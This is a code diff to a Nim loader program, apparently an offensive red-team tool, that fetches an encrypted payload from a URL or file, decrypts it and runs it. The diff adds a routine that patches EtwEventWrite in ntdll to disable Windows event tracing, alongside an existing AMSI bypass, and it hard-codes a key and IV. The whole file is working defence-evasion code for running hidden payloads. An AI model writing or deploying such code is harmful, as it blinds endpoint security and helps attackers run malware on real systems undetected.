@@ -1,5 +1,5 @@
 import strutils # basic string manipulation functionality
-import dynlib # for our AMSI bypass
+import dynlib # for our AMSI and EDR bypass
 import byteutils # basic byte manipulation functionality 
 import nimcrypto # for decryption
 import nimcrypto/sysrand # for decryption
@@ -12,7 +12,7 @@ import shlex #parameter splitting
 import std/httpclient
 
 
-const iv: array[aes256.sizeBlock, byte]= [byte 55, 19, 19, 173, 190, 70, 130, 254, 26, 241, 14, 4, 213, 94, 108, 237]
+const iv: array[aes256.sizeBlock, byte]= [byte 148, 181, 90, 151, 26, 242, 253, 114, 7, 217, 24, 204, 125, 203, 26, 167]
 const envkey: string = "myverysecretkey"
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
@@ -62,6 +62,42 @@ proc download(url: string):string=
     text=client.getContent(url)
     result=text.strip(leading = true, trailing = true)
 
+proc Patchntdll(): bool =
+    var
+        ntdll: LibHandle
+        cs: pointer
+        op: DWORD
+        t: DWORD
+        disabled: bool = false
+
+    when defined amd64:
+        echo "[*] Running in x64 process"
+        const patch: array[1, byte] = [byte 0xc3]
+    elif defined i386:
+        echo "[*] Running in x86 process"
+        const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
+
+    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
+    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
+    ntdll = loadLib("ntdll")
+    if isNil(ntdll):
+        echo "[X] Failed to load ntdll.dll"
+        return disabled
+
+    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
+    if isNil(cs):
+        echo "[X] Failed to get the address of 'EtwEventWrite'"
+        return disabled
+
+    if VirtualProtect(cs, patch.len, 0x40, addr op):
+        echo "[*] Applying patch"
+        copyMem(cs, unsafeAddr patch, patch.len)
+        VirtualProtect(cs, patch.len, op, addr t)
+        disabled = true
+
+    return disabled
+
+
 
 proc PatchAmsi(): bool =
     var
@@ -108,7 +144,7 @@ when isMainModule:
     var helpMsg: string="""
     nimLoader.exe [-d] [-D] [-k] [-p:'parameters']  <fileOrUrl.txt>
     -d: Decrypt file or url
-    -k key: key for decryption. Defaults to TARGETDOMAIN
+    -k key: key for decryption. Defaults to myverysecretkey
     -D: Show debugging info
     """ # help msg
     var parameters: string="" # parameters to the program to launch
@@ -156,23 +192,33 @@ when isMainModule:
       quit()
 
     #######################
-    # 2. GET THE TOOL'S BYTES
+    # 2. FIRST, PATCH ETW
     #######################
+
+    success = Patchntdll()
+    if debug:
+      echo fmt"[*] ETW blocked by patch: {bool(success)}"
+
+
+    #######################
+    # 3. GET THE TOOL'S BYTES
+    #######################
+
     var contents: string=""
     if debug:
       echo "Identify input:", inFile
 
     if inFile[0..6]=="http://" or inFile[0..7]=="https://":
+      contents =download(inFile)
       if debug:
         echo "Input is Url. Downloading and loading"
-        contents =download(inFile)
     else:
+      contents = readFile(inFile).strip(leading = true, trailing = true)# read file contents
       if debug:
         echo "Input is File. Loading"
 
 
 
-      contents = readFile(inFile).strip(leading = true, trailing = true)# read file contents
     if debug:
       echo "Tool parameters are:" & parameters
 
